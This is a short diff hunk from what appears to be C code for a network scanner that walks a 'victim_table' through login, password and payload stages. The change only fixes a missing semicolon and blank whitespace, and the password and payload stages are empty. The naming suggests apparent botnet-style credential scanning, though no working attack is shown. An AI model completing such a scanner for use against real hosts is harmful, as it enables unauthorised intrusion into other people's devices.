@@ -336,11 +336,11 @@ skip:
 					}
 					then go readuntil(sock, userwords)
 					*/
-					scan_readuntil(victim_table[i].sock, "login")
+					scan_readuntil(victim_table[i].sock, "login");
 				}
 				case PASSWORD:
 				{
-					
+
 				}
 				case PAYLOAD:
 				{
